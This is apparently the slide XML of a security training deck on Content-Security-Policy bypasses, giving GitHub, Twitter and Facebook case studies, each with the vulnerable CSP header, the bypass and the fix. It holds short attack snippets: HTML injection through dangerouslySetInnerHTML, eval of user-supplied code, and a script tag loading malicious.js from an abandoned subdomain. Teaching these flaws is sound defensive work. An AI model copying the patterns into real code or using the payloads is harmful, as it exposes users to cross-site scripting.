          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>More Real-World Examples</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1077873" y="2114074"/>
            <a:ext cx="6165294" cy="5156240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 526"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFCF5"/>
          </a:solidFill>
          <a:ln w="22860">
            <a:solidFill>
              <a:srgbClr val="D9D4C9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1100733" y="2136934"/>
            <a:ext cx="6119574" cy="542330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4024908" y="2238613"/>
            <a:ext cx="271105" cy="338971"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1281470" y="2823329"/>
            <a:ext cx="2845237" cy="282416"/>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GitHub CSP Bypass (2017)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1281470" y="3192185"/>
            <a:ext cx="5758101" cy="259794"/>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Vulnerable CSP:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1281470" y="3614023"/>
            <a:ext cx="5758101" cy="790575"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3430"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1272540" y="3614023"/>
            <a:ext cx="5775960" cy="790575"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3430"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1453277" y="3749516"/>
            <a:ext cx="5414486" cy="519589"/>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Content-Security-Policy: script-src 'self' https://github.githubassets.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1281470" y="4566642"/>
            <a:ext cx="5758101" cy="259794"/>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Bypass Method:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1281470" y="4988481"/>
            <a:ext cx="5758101" cy="530781"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5109"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1272540" y="4988481"/>
            <a:ext cx="5775960" cy="530781"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5109"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1453277" y="5123974"/>
            <a:ext cx="5414486" cy="259794"/>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&lt;div dangerouslySetInnerHTML={{__html: userInput}} /&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1281470" y="5681305"/>
            <a:ext cx="5758101" cy="779383"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Why it worked:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> React framework was whitelisted. dangerouslySetInnerHTML allowed HTML injection. React rendered attacker-controlled HTML.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1281470" y="6547128"/>
            <a:ext cx="5758101" cy="519589"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Fix:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Removed dangerouslySetInnerHTML usage. Implemented proper sanitization.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7387233" y="2114074"/>
            <a:ext cx="6165294" cy="5156240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 526"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFCF5"/>
          </a:solidFill>
          <a:ln w="22860">
            <a:solidFill>
              <a:srgbClr val="D9D4C9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7410093" y="2136934"/>
            <a:ext cx="6119574" cy="542330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10334268" y="2238613"/>
            <a:ext cx="271105" cy="338971"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7590830" y="2823329"/>
            <a:ext cx="2847737" cy="282416"/>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Twitter CSP Bypass (2018)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7590830" y="3192185"/>
            <a:ext cx="5758101" cy="259794"/>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Vulnerable CSP:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7590830" y="3614023"/>
            <a:ext cx="5758101" cy="790575"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3430"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7581900" y="3614023"/>
            <a:ext cx="5775960" cy="790575"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3430"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7762637" y="3749516"/>
            <a:ext cx="5414486" cy="519589"/>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Content-Security-Policy: script-src 'self' https://cdn.twitter.com 'unsafe-eval'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7590830" y="4566642"/>
            <a:ext cx="5758101" cy="259794"/>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Bypass Method:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7590830" y="4988481"/>
            <a:ext cx="5758101" cy="530781"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5109"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Shape 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7581900" y="4988481"/>
            <a:ext cx="5775960" cy="530781"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5109"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7762637" y="5123974"/>
            <a:ext cx="5414486" cy="259794"/>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eval(userProvidedCode)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7590830" y="5681305"/>
            <a:ext cx="5758101" cy="519589"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Why it worked:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Video player was whitelisted. unsafe-eval allowed eval(). Video player didn't sanitize URLs.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7590830" y="6287333"/>
            <a:ext cx="5758101" cy="259794"/>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Fix:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Removed unsafe-eval. Implemented URL validation.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956905"/>
            <a:ext cx="904875" cy="426244"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6386"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBE8F0"/>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878" y="1079302"/>
            <a:ext cx="181451" cy="181451"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1202055" y="1024890"/>
            <a:ext cx="360521" cy="290274"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2019</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="1473875"/>
            <a:ext cx="9217938"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Example 4: Facebook CSP Bypass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="27496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Vulnerable CSP:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="3359110"/>
            <a:ext cx="6244709" cy="1065848"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3192"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="782479" y="3359110"/>
            <a:ext cx="6267331" cy="1065848"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3192"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1009293" y="3529132"/>
            <a:ext cx="5813703"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Content-Security-Policy: script-src 'self' *.facebook.com 'nonce-random'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="46801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Bypass Method:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="5289590"/>
            <a:ext cx="6244709" cy="1065848"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3192"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="782479" y="5289590"/>
            <a:ext cx="6267331" cy="1065848"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3192"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1009293" y="5459611"/>
            <a:ext cx="5813703"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&lt;script src="https://old-abandoned.facebook.com/malicious.js"&gt;&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>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99521" y="2806303"/>
            <a:ext cx="226814" cy="226814"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7599521" y="3133011"/>
            <a:ext cx="6244709" cy="30480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7599521" y="33073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Why it worked</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7599521" y="3888462"/>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Wildcard subdomain whitelist. Old subdomain was not properly decommissioned. Attacker registered abandoned subdomain.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>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99521" y="5039439"/>
            <a:ext cx="226814" cy="226814"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7599521" y="5366147"/>
            <a:ext cx="6244709" cy="30480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7599521" y="55404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Fix</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7599521" y="6121598"/>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Removed wildcard subdomain. Explicit subdomain whitelisting. Regular subdomain audits.</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805232" y="986076"/>
            <a:ext cx="5071824" cy="408503"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Advanced CSP Bypass Methods</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2805232" y="1424702"/>
            <a:ext cx="3883581" cy="326827"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
